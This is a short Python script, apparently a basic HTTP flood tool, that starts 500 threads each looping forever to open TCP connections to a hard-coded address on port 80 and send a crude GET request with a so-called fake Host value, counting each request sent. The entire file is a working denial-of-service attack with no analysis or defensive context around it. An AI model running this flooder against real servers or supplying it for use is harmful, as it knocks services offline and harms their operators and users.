from concurrent.futures import thread
import threading
import socket

target ='192.168.0.107'
port=80
fake_id='192.16.3.205'
counter=0

def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_id + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        global counter
        counter +=1
        print(counter)

for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()